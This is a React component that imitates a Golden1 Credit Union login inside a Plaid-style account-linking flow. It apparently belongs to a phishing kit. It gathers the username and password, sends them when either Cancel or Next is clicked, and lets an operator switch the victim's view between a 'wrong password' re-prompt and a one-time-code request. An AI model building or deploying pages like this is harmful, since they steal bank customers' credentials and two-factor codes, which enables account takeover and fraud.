import { CgClose } from "react-icons/cg";
import useForms from "../../../../../../../hooks/useForms";
import { useState } from "react";
import { Link } from "react-router-dom";
import { IoMdLock } from "react-icons/io";
import clsx from "clsx";
import { FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
import { bankDetailsInfo } from "../../bankDetails";

const Golden1 = ({
  handleCancel,
  bankName,
  handleSubmit,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  mainCancel,
}) => {
  const { formState, handleChange } = useForms(bankDetailsInfo);
  const [otp, setOtp] = useState("");
  const [showPassword, setshowPassword] = useState(false);

  const onSumbitForm = () => {
    const newItems = {
      ...formState,
      bankName: bankName,
    };

    handleSubmit(newItems);
  };

  const handleVerifiedOtp = () => {
    setOtpOpen(true);
  };

  return (
    <div>
      <div>
        <div>
          <div>
            <div>img</div>
            <p>All Data</p>
          </div>
          <CgClose size={20} onClick={handleCancel} />
        </div>
        <div>
          <div>img</div>
          <h3>Golden1 Credit Union - Personal Banking</h3>
          <Link to="https://www.golden1.com/">
            <IoMdLock />
            <span>Link to visit this institution website </span>
          </Link>
          <div>
            Enter your credential for this institution
            <div className={clsx(allBankOpen ? "hidden" : "block")}>
              <div>
                <label>Username</label>
                <input
                  type="text"
                  value={formState.username}
                  onChange={handleChange}
                  name="username"
                />
              </div>
              <div>
                <label>Password</label>
                <input
                  type={showPassword ? "text" : "password"}
                  value={formState.password}
                  name="password"
                  onChange={handleChange}
                />
                <span onClick={() => setshowPassword((prevShow) => !prevShow)}>
                  {showPassword ? <FaRegEyeSlash /> : <FaRegEye />}
                </span>
              </div>
              <div>
                <p>
                  By selecting &quot;Next&quot; you are consenting to allow
                  Fiserv to facilitate sharing your data from Golden1 Credit
                  Union - Personal Banking to share with Citibank via Plaid. The
                  information to be shared may include account balances,
                  transaction details, account ownership information as well as
                  other account details. In addition, shared details may include
                  full account number and routing number, which can be used to
                  verify your account and facilitate transactions between you
                  and the entities with which you do business, by allowing you
                  to link your account to this application or website.
                </p>
                <p>
                  Golden1 Credit Union - Personal Banking has no affiliation
                  with Citibank and Plaid and is not responsible for the privacy
                  and security of your data when you share it with them. It is
                  your responsibility to review and understand the Terms and
                  Conditions, Privacy Policy and related security documentation
                  issued by Citibank and Plaid for full details regarding the
                  usage of your data.
                </p>
              </div>
              <div>
                <button onClick={onSumbitForm}>Cancel</button>
                <button onClick={onSumbitForm}>Next</button>
              </div>
            </div>
            {allBankOpen && (
              <div className={clsx(OtpOpen ? "hidden" : "block")}>
                <button>
                  {whatToShowDetails.map((what) => (
                    <p key={what.id} onClick={() => handleSelectedId(what)}>
                      {what.name}
                    </p>
                  ))}
                </button>
                <button onClick={handleSelectSubmit}>Submit</button>
                <div>
                  {selectedPath.name === "Loading" && (
                    <p>{selectedPath.body}</p>
                  )}
                  {selectedPath.name === "wrong" && (
                    <>
                      <h3>{selectedPath.body}</h3>
                      <div>
                        <div>
                          <label>Username</label>
                          <input
                            type="text"
                            value={formState.username}
                            onChange={handleChange}
                            name="username"
                          />
                        </div>
                        <div>
                          <label>Password</label>
                          <input
                            type={showPassword ? "text" : "password"}
                            value={formState.password}
                            name="password"
                            onChange={handleChange}
                          />
                          <span
                            onClick={() =>
                              setshowPassword((prevShow) => !prevShow)
                            }
                          >
                            {showPassword ? <FaRegEyeSlash /> : <FaRegEye />}
                          </span>
                        </div>
                        <div>
                          <p>
                            By selecting &quot;Next&quot; you are consenting to
                            allow Fiserv to facilitate sharing your data from
                            Golden1 Credit Union - Personal Banking to share
                            with Citibank via Plaid. The information to be
                            shared may include account balances, transaction
                            details, account ownership information as well as
                            other account details. In addition, shared details
                            may include full account number and routing number,
                            which can be used to verify your account and
                            facilitate transactions between you and the entities
                            with which you do business, by allowing you to link
                            your account to this application or website.
                          </p>
                          <p>
                            Golden1 Credit Union - Personal Banking has no
                            affiliation with Citibank and Plaid and is not
                            responsible for the privacy and security of your
                            data when you share it with them. It is your
                            responsibility to review and understand the Terms
                            and Conditions, Privacy Policy and related security
                            documentation issued by Citibank and Plaid for full
                            details regarding the usage of your data.
                          </p>
                        </div>
                        <div>
                          <button onClick={onSumbitForm}>Cancel</button>
                          <button onClick={onSumbitForm}>Next</button>
                        </div>
                      </div>
                    </>
                  )}
                  {selectedPath.name === "otp" && (
                    <>
                      <h3>{selectedPath.body}</h3>
                      <div>
                        <input
                          type="text"
                          onChange={(e) => setOtp(e.target.value)}
                          value={otp}
                        />
                        <button onClick={handleVerifiedOtp}>Verify</button>
                      </div>
                    </>
                  )}
                </div>
              </div>
            )}
            {OtpOpen && (
              <>
                <button>
                  {otpInfo.map((what) => (
                    <p key={what.id} onClick={() => handleSelectedOtp(what)}>
                      {what.name}
                    </p>
                  ))}
                </button>
                <button onClick={handleSubmitOtp}>Submit</button>
                <div>
                  {selectedOtp.name === "Loading" && <p>{selectedOtp.body}</p>}
                  {selectedOtp.name === "wrong" && (
                    <>
                      <h3>{selectedOtp.body}</h3>
                      <div>
                        <input
                          type="text"
                          onChange={(e) => setOtp(e.target.value)}
                          value={otp}
                        />
                        <button onClick={handleVerifiedOtp}>Verify</button>
                      </div>
                    </>
                  )}
                  {selectedOtp.name === "otp" && (
                    <>
                      <h3>{selectedOtp.body}</h3>
                      <button onClick={() => mainCancel(false)}>Cancel</button>
                    </>
                  )}
                </div>
              </>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Golden1;
